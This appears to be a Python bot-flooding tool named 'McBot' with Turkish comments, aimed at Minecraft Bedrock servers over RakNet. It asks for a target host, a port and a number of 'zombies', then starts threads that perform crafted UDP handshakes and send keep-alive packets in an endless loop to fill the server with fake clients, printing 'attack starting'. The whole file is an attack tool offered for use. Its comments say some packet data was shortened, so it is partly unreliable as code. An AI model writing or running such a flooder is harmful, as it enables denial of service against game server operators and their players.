# Hataları giderilmiş ve eksikleri tamamlanmış sürüm
import socket
import threading
import uuid
import time
import random
import os

# Görsel banner ve temizlik
def banner():
    print("⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠋⠉⠁⠄⠄⠈⠙⠻⣿⣿⣿⣿")
    print("⣿⣿⣿⣿⣿⣿⠟⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿")
    print("⣿⣿⣿⣿⡿⠃⠄⠄⠄⢀⣀⣀⡀⠄⠄⠄⠄⠄⠄⠄⠈⢿")
    print("⣿⣿⣿⡟⠄⠄⠄⠄⠐⢻⣿⣿⣿⣷⡄⠄⠄⠄⠄⠄⠄⠈")
    print("⣿⣿⣿⠃⠄⠄⠄⢀⠴⠛⠙⣿⣿⡿⣿⣦⠄⠄⠄⠄⠄⠄")
    print("⣿⣿⠃⠄⢠⡖⠉⠄⠄⠄⣠⣿⡏⠄⢹⣿⠄⠄⠄⠄⠄⢠")
    print("⣿⠃⠄⠄⢸⣧⣤⣤⣤⢾⣿⣿⡇⠄⠈⢻⡆⠄⠄⠄⠄⣾")
    print("⠁⠄⠄⠄⠈⠉⠛⢿⡟⠉⠉⣿⣷⣀⠄⠄⣿⡆⠄⠄⢠⣿")
    print("⠄⠄⠄⠄⠄⠄⢠⡿⠿⢿⣷⣿⣿⣿⣿⣿⠿⠃⠄⠄⣸⣿")
    print("⠄⠄⠄⠄⠄⢀⡞⠄⠄⠄⠈⣿⣿⣿⡟⠁⠄⠄⠄⠄⣿⣿")
    print("⠄⠄⠄⠄⠄⢸⠄⠄⠄⠄⢀⣿⣿⡟⠄⠄⠄⠄⠄⢠⣿⣿")
    print("⠄⠄⠄⠄⠄⠘⠄⠄⠄⢀⡼⠛⠉⠄⠄⠄⠄⠄⠄⣼⣿⣿")
    print("⠄⠄⠄⠄⠄⡇⠄⠄⢀⠎⠄⠄⠄⠄FlackTeam")
    print("⠄⠄⠄⠄⢰⠃⠄⢀⠎⠄⠄⠄McBot (Fixed Version)")
    time.sleep(1)
    os.system("clear" if os.name == "posix" else "cls")

banner()

# Kullanıcı Girişleri
escolher_host = input("\x1b[32m(host): \x1b[0m")
port = int(input("\x1b[32m(port): \x1b[0m"))
c = int(input("\x1b[32m(zombies): \x1b[0m"))

# Sabit Nickname (Eksik olan buydu)
# Not: Hex formatında 'Flack' ismini temsil eder
nickname = "466c61636b" 

# Sunucu Bilgileri
try:
    host = socket.gethostbyname(escolher_host)
except socket.gaierror:
    print("Hata: Geçersiz Host!")
    exit()

# IP Byte Dönüştürme
ip_parts = host.split(".")
ip_in_bytes = "".join([hex(~int(x) & 0xff)[2:].zfill(2) for x in ip_parts])
ip_and_port_in_hex = (host + ":" + str(port)).encode().hex()

class Colors:
    Green = "\033[32m"
    Red = "\033[31m"
    Reset = "\033[0m"

class guid:
    guid1 = str(uuid.uuid1()).lower().split("-")
    guid4 = str(uuid.uuid4()).lower().split("-")

class RakNet:
    Magic = "00ffff00fefefefefdfdfdfd12345678"
    Creq1 = "05" + Magic + "07" + "0" * 2892
    Creq2 = "07" + Magic + "04" + ip_in_bytes + hex(port)[2:].zfill(4) + "05b8" + "0" * 8 + guid.guid4[2] + guid.guid4[1]

class GamePackets:
    Ready = "840100006002f0010000000000001304" + ip_in_bytes + hex(port)[2:].zfill(4) + "0480fffffe4abc04ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff000004ffffffff0000000000000000"

a = {}
k = 0

def bot_connect():
    global k
    k += 1
    key = f"bot_{k}"
    
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client.settimeout(5) # Sunucu yanıt vermezse kilitlenmemesi için
        a[key] = client
        
        # Aşama 1: Bağlantı İsteği
        client.sendto(bytes.fromhex(RakNet.Creq1), (host, port))
        data, _ = client.recvfrom(5000)
        
        if data.startswith(bytes.fromhex("06")):
            # Aşama 2: Connection Request 2
            client.sendto(bytes.fromhex(RakNet.Creq2), (host, port))
            data, _ = client.recvfrom(5000)
            
        if data.startswith(bytes.fromhex("08")):
            # Aşama 3: Login Paketleri (Çok uzun hex dizileri kısaltılmıştır, orijinali korunabilir)
            login_packet = "84" + "0" * 6 + "400090" + "0" * 6 + "09" + "0" * 8 + guid.guid4[2] + guid.guid4[1] + "0" * 12 + guid.guid1[2] + "00"
            client.sendto(bytes.fromhex(login_packet), (host, port))
            data, _ = client.recvfrom(5000)
            
        if data.startswith(bytes.fromhex("80")):
            # Başarılı bağlantı simülasyonu
            print(f"{Colors.Green}[+]{Colors.Reset} Bot {k} sunucuya bağlandı!")
            
            # Bağlantıyı canlı tutma döngüsü
            while True:
                for i in range(256):
                    keep_alive = "c0000101" + hex(i)[2:].zfill(2) + "0000"
                    client.sendto(bytes.fromhex(keep_alive), (host, port))
                    time.sleep(0.15)
                    
    except Exception as e:
        print(f"{Colors.Red}[-]{Colors.Reset} Bot {k} bağlantı hatası: {e}")

# Threadleri Başlat
threads = []
print(f"{Colors.Green}Saldırı başlatılıyor...{Colors.Reset}")
for i in range(c):
    t = threading.Thread(target=bot_connect)
    t.daemon = True # Ana program kapandığında threadlerin kapanması için
    t.start()
    threads.append(t)
    time.sleep(0.1)

# Programı açık tut
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nDurduruldu.")